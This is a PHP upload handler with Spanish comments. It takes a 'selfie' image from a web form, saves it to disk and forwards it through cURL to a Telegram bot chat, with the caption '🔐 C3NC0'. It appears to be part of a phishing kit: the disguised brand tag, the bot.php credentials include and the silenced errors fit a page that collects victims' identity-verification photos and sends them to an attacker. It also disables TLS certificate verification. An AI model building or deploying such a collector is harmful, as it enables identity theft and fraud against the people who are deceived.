<?php
// Inicializar buffer de salida y configurar headers ANTES de cualquier output
ob_start();
ini_set('display_errors', 0);
error_reporting(0);

session_start();
header('Content-Type: application/json');
include 'bot.php';

// Función para enviar respuesta JSON
function sendResponse($success, $message, $data = null) {
    // Limpiar cualquier output anterior
    ob_clean();
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'data' => $data
    ]);
    exit;
}


// Verificar que se recibió una imagen
if (!isset($_FILES['selfie']) || $_FILES['selfie']['error'] !== UPLOAD_ERR_OK) {
    sendResponse(false, 'No se recibió ninguna imagen válida');
}

$uploadedFile = $_FILES['selfie'];

// Validar tipo de archivo
$allowedTypes = ['image/jpeg', 'image/jpg', 'image/png'];
if (!in_array($uploadedFile['type'], $allowedTypes)) {
    sendResponse(false, 'Tipo de archivo no permitido. Solo JPEG y PNG');
}

// Validar tamaño (máximo 5MB)
$maxSize = 5 * 1024 * 1024; // 5MB
if ($uploadedFile['size'] > $maxSize) {
    sendResponse(false, 'El archivo es demasiado grande. Máximo 5MB');
}

try {
    // Generar nombre único para el archivo
    $fileName = 'selfie_' . date('Y-m-d_H-i-s') . '_' . uniqid() . '.jpg';
    $uploadPath = 'uploads/' . $fileName;
    
    // Crear directorio si no existe
    if (!is_dir('uploads')) {
        mkdir('uploads', 0755, true);
    }
    
    // Mover archivo temporal al directorio de uploads
    if (!move_uploaded_file($uploadedFile['tmp_name'], $uploadPath)) {
        sendResponse(false, 'Error al guardar el archivo');
    }
    
    // Enviar a Telegram
    $telegramResult = sendPhotoToTelegram($botToken, $chatId, $uploadPath, $fileName, $username);
    
    if ($telegramResult['success']) {
        // Opcional: eliminar archivo local después de enviar
        // unlink($uploadPath);
        
        sendResponse(true, 'Imagen enviada correctamente a Telegram', [
            'file_name' => $fileName,
            'telegram_file_id' => $telegramResult['file_id']
        ]);
    } else {
        sendResponse(false, 'Error al enviar a Telegram: ' . $telegramResult['message']);
    }
    
} catch (Exception $e) {
    sendResponse(false, 'Error del servidor: ' . $e->getMessage());
}

/**
 * Función para enviar foto a Telegram
 */
function sendPhotoToTelegram($botToken, $chatId, $photoPath, $caption = '', $username = 'Usuario') {
    $apiUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
    
    // Preparar datos para cURL
    $postData = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($photoPath)),
        'caption' => "🔐 C3NC0 |\n\n📸 Selfie: {$caption}\n⏰ Fecha: " . date('d/m/Y H:i:s')
    ];
    
    // Configurar cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    // Ejecutar petición
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    if (curl_errno($ch)) {
        curl_close($ch);
        return [
            'success' => false,
            'message' => 'Error cURL: ' . curl_error($ch)
        ];
    }
    
    curl_close($ch);
    
    // Procesar respuesta
    $responseData = json_decode($response, true);
    
    if ($httpCode === 200 && $responseData['ok']) {
        return [
            'success' => true,
            'message' => 'Imagen enviada correctamente',
            'file_id' => $responseData['result']['photo'][0]['file_id']
        ];
    } else {
        return [
            'success' => false,
            'message' => $responseData['description'] ?? 'Error desconocido de Telegram'
        ];
    }
}

/**
 * Función opcional para obtener información del chat
 */
function getChatInfo($botToken, $chatId) {
    $apiUrl = "https://api.telegram.org/bot{$botToken}/getChat";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl . "?chat_id=" . urlencode($chatId));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return json_decode($response, true);
}
?>
